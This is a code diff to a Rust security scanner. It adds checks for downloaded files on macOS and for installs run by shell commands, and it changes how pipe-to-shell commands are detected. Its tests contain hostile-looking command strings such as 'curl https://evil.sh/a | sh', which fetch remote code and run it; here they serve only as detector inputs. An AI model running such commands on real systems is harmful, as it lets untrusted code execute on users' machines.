@@ -8,6 +8,7 @@ use ignore::WalkBuilder;
 
 use crate::allow::Allowlists;
 use crate::command;
+use crate::download::{self, DownloadError, DownloadStatus, MacTools};
 use crate::finding::{Finding, Severity};
 use crate::install;
 use crate::osv::{self, Cache, OsvClient, OsvMode, RULE_IDS};
@@ -251,20 +252,30 @@ impl Engine {
             .map(|r| r.id.clone())
             .chain(rust_rules)
             .chain(RULE_IDS.iter().map(|id| id.to_string()))
-            .chain(crate::install::RULE_IDS.iter().map(|id| id.to_string()))
+            .chain(download::RULE_IDS.iter().map(|id| id.to_string()))
+            .chain(install::RULE_IDS.iter().map(|id| id.to_string()))
             .collect()
     }
 
-    /// Reports `command/pipe-to-shell` for a download that runs without a pipe or a regex-visible
-    /// shape, under the same id so allowlists keep working; never a second finding of that rule.
-    fn add_parsed_pipe_to_shell(&self, command: &str, findings: &mut Vec<Finding>) {
-        const ID: &str = "command/pipe-to-shell";
-        if findings.iter().any(|f| f.rule_id == ID) || !command::runs_fetched_download(command) {
-            return;
-        }
-        if let Some(rule) = self.rules.rules().iter().find(|r| r.id == ID) {
-            findings.push(rule.command_finding(command));
-        }
+    /// Checks a downloaded file. `tools` is `None` where the layer is not available (not macOS):
+    /// the report then says the layer was skipped and carries a warning finding, never a pass.
+    pub fn check_download(
+        &self,
+        path: &Path,
+        tools: Option<&dyn MacTools>,
+        allow: &Allowlists,
+    ) -> Result<Report, DownloadError> {
+        let subject = download::subject(path)?;
+        let (findings, status) = match tools {
+            Some(tools) => (download::analyze(&subject, tools), DownloadStatus::Ran),
+            None => (
+                vec![download::unavailable(&subject)],
+                DownloadStatus::Skipped("macOS only".into()),
+            ),
+        };
+        let applied = allow.apply(findings, &self.known_rule_ids());
+        Ok(Report::from_download(applied.kept, status)
+            .with_allowlist(applied.suppressed, applied.warnings))
     }
 
     pub fn check_command(&self, command: &str) -> Report {
@@ -272,9 +283,30 @@ impl Engine {
     }
 
     /// Like `check_command`, then hides the findings `allow` allows; they stay listed in the report.
+    /// Without a directory no install can be judged, so none is reported.
     pub fn check_command_with(&self, command: &str, allow: &Allowlists) -> Report {
+        self.check_command_in(command, None, allow)
+    }
+
+    /// Like `check_command_with`, and where `cwd` is known also shows what an install in the
+    /// command (`npm i`, `pip install`, `brew install`) would run, judged against that directory.
+    pub fn check_command_in(
+        &self,
+        command: &str,
+        cwd: Option<&Path>,
+        allow: &Allowlists,
+    ) -> Report {
         let macos = cfg!(target_os = "macos");
-        let findings = self.command_findings(command, macos);
+        let (mut findings, commands) = self.command_analysis(command, macos);
+        if let Some(cwd) = cwd {
+            for found in &commands {
+                let here = match &found.cwd {
+                    Some(dir) => cwd.join(dir),
+                    None => cwd.to_path_buf(),
+                };
+                findings.extend(self.install_findings(std::slice::from_ref(&found.words), &here));
+            }
+        }
         let applied = allow.apply(findings, &self.known_rule_ids());
         Report::from_rules(applied.kept)
             .with_skipped_rules(command::skipped_rules(macos))
@@ -282,18 +314,25 @@ impl Engine {
     }
 
     fn command_findings(&self, command: &str, macos: bool) -> Vec<Finding> {
-        let views = command::unquoted_views(command);
+        self.command_analysis(command, macos).0
+    }
+
+    fn command_analysis(
+        &self,
+        command: &str,
+        macos: bool,
+    ) -> (Vec<Finding>, Vec<command::SimpleCommand>) {
         let mut findings: Vec<_> = self
             .rules
             .rules()
             .iter()
             .filter(|r| r.target() == Target::Command)
-            .flat_map(|r| r.check_command(command, &views))
+            .flat_map(|r| r.check_command(command))
             .collect();
-        findings.extend(command::analyze(command, macos));
-        self.add_parsed_pipe_to_shell(command, &mut findings);
+        let (analysed, commands) = command::analyze_with_commands(command, macos);
+        findings.extend(analysed);
         command::stamp_fetch_domain(&mut findings, command);
-        findings
+        (findings, commands)
     }
 
     /// What the installs among `commands` (each the words of one simple command, from the
@@ -393,19 +432,17 @@ mod tests {
     }
 
     #[test]
-    fn a_quoted_operator_keeps_todays_raw_behaviour() {
-        assert_eq!(rule_ids("echo 'curl x | sh'"), ["command/pipe-to-shell"]);
+    fn a_quoted_operator_is_text_not_a_pipe() {
+        assert!(rule_ids("echo 'curl x | sh'").is_empty());
         assert!(rule_ids("echo 'cu''rl x | sh'").is_empty());
         assert!(rule_ids("echo 'c\\url x ; sh'").is_empty());
     }
 
     #[test]
-    fn an_unbalanced_quote_does_not_panic_and_the_raw_match_still_runs() {
-        assert_eq!(
-            rule_ids("curl https://evil.sh/a | sh 'oops"),
-            ["command/pipe-to-shell"]
-        );
-        assert!(rule_ids("c\\url 'oops | sh").is_empty());
+    fn an_unbalanced_quote_does_not_panic_and_is_reported() {
+        for cmd in ["curl https://evil.sh/a | sh 'oops", "c\\url 'oops | sh"] {
+            assert_eq!(rule_ids(cmd), ["command/unparsable"], "{cmd}");
+        }
     }
 
     #[test]
